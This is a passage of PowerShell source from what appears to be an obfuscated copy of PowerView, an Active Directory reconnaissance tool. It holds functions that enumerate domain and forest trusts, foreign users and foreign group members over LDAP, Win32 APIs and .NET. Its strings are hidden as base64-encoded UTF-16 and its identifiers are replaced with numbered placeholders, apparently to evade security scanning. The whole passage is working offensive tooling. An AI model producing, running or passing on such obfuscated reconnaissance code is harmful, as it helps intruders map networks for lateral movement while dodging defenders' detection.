        if ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            ${57} = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                ${63} = $Domain
            }
            else {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                    ${63} = (f69 -Credential $Credential).Name
                }
                else {
                    ${63} = (f69).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
            if ($Domain -and $Domain.Trim() -ne '') {
                ${63} = $Domain
            }
            else {
                ${63} = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA=')))) {
            ${71} = f74 @84
            ${83} = f73 @57
            if (${71}) {
                ${71}.Filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABDAGwAYQBzAHMAPQB0AHIAdQBzAHQAZQBkAEQAbwBtAGEAaQBuACkA')))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${71}.FindOne() }
                else { ${72} = ${71}.FindAll() }
                ${72} | ? {$_} | % {
                    ${73} = $_.Properties
                    ${60} = New-Object PSObject
                    ${75} = @()
                    ${75} += ${82}.Keys | ? { ${73}.trustattributes[0] -band $_ } | % { ${82}[$_] }
                    ${74} = Switch (${73}.trustdirection) {
                        0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
                    }
                    ${76} = Switch (${73}.trusttype) {
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAE4ATwBOAF8AQQBDAFQASQBWAEUAXwBEAEkAUgBFAEMAVABPAFIAWQA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBJAE4ARABPAFcAUwBfAEEAQwBUAEkAVgBFAF8ARABJAFIARQBDAFQATwBSAFkA'))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBJAFQA'))) }
                    }
                    ${80} = ${73}.distinguishedname[0]
                    ${81} = ${80}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    if (${81}) {
                        ${63} = $(${80}.SubString(${81})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    }
                    else {
                        ${63} = ""
                    }
                    ${79} = ${80}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABDAE4APQBTAHkAcwB0AGUAbQA='))))
                    if (${81}) {
                        $TargetDomain = ${80}.SubString(3, ${79}-3)
                    }
                    else {
                        $TargetDomain = ""
                    }
                    ${78} = New-Object Guid @(,${73}.objectguid[0])
                    ${77} = (New-Object System.Security.Principal.SecurityIdentifier(${73}.securityidentifier[0],0)).Value
                    ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${63}
                    ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${73}.name[0]
                    ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) ${76}
                    ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) $(${75} -join ',')
                    ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADcANAB9AA==')))
                    ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAHIAZQBhAHQAZQBkAA=='))) ${73}.whencreated[0]
                    ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAGgAYQBuAGcAZQBkAA=='))) ${73}.whenchanged[0]
                    ${60}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBMAEQAQQBQAA=='))))
                    ${60}
                }
                if (${72}) {
                    try { ${72}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                    }
                }
                ${71}.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
                ${70} = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                ${70} = $Domain
            }
            else {
                ${70} = $Null
            }
            ${59} = [IntPtr]::Zero
            ${69} = 63
            ${68} = 0
            ${58} = ${6}::DsEnumerateDomainTrusts(${70}, ${69}, [ref]${59}, [ref]${68})
            ${f1} = ${59}.ToInt64()
            if ((${58} -eq 0) -and (${f1} -gt 0)) {
                ${65} = ${13}::GetSize()
                for (${67} = 0; (${67} -lt ${68}); ${67}++) {
                    ${66} = New-Object System.Intptr -ArgumentList ${f1}
                    ${61} = ${66} -as ${13}
                    ${f1} = ${66}.ToInt64()
                    ${f1} += ${65}
                    ${62} = ''
                    ${58} = ${5}::ConvertSidToStringSid(${61}.DomainSid, [ref]${62});${64} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if (${58} -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] ${64}).Message)"
                    }
                    else {
                        ${60} = New-Object PSObject
                        ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${63}
                        ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${61}.DnsDomainName
                        ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBlAHQAYgBpAG8AcwBOAGEAbQBlAA=='))) ${61}.NetbiosDomainName
                        ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))) ${61}.Flags
                        ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAZQBuAHQASQBuAGQAZQB4AA=='))) ${61}.ParentIndex
                        ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) ${61}.TrustType
                        ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) ${61}.TrustAttributes
                        ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBpAGQA'))) ${62}
                        ${60} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARwB1AGkAZAA='))) ${61}.DomainGuid
                        ${60}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBBAFAASQA='))))
                        ${60}
                    }
                }
                $Null = ${6}::NetApiBufferFree(${59})
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] ${58}).Message)"
            }
        }
        else {
            ${56} = f69 @57
            if (${56}) {
                ${56}.GetAllTrustRelationships() | % {
                    $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBOAEUAVAA='))))
                    $_
                }
            }
        }
    }
}
function f67 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${55} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${55}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${55}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${54} = f72 @55
        if (${54}) {
            ${54}.GetAllTrustRelationships() | % {
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAHMAdABUAHIAdQBzAHQALgBOAEUAVAA='))))
                $_
            }
        }
    }
}
function Get-DomainForeignUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} = @{}
        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgBvAGYAPQAqACkA')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        f71 @48  | % {
            ForEach (${50} in $_.memberof) {
                ${53} = ${50}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                if (${53}) {
                    ${46} = $(${50}.SubString(${53})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    ${52} = $_.distinguishedname
                    ${51} = ${52}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    $UserDomain = $($_.distinguishedname.SubString(${51})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    if (${46} -ne $UserDomain) {
                        ${45} = ${50}.Split(',')[0].split('=')[1]
                        ${49} = New-Object PSObject
                        ${49} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                        ${49} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $_.samaccountname
                        ${49} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) $_.distinguishedname
                        ${49} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${46}
                        ${49} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${45}
                        ${49} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${50}
                        ${49}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAFUAcwBlAHIA'))))
                        ${49}
                    }
                }
            }
        }
    }
}
function Get-DomainForeignGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} = @{}
        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgA9ACoAKQA=')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        ${47} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABVAHMAZQByAHMA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA'))))
        f70 @48 | ? { ${47} -notcontains $_.samaccountname } | % {
            ${45} = $_.samAccountName
            ${44} = $_.distinguishedname
            ${46} = ${44}.SubString(${44}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
            $_.member | % {
                ${43} = $_.SubString($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                if (($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwAtADEALQA1AC0AMgAxAC4AKgAtAC4AKgA=')))) -or (${46} -ne ${43})) {
                    ${41} = $_
                    ${42} = $_.Split(',')[0].split('=')[1]
                    ${40} = New-Object PSObject
                    ${40} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${46}
                    ${40} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${45}
                    ${40} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${44}
                    ${40} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${43}
                    ${40} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${42}
                    ${40} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${41}
                    ${40}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                    ${40}
                }
            }
        }
    }
}
function Get-DomainTrustMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${38} = @{}
    ${32} = New-Object System.Collections.Stack
    ${37} = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))] = $API }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))] = $NET }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${37}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
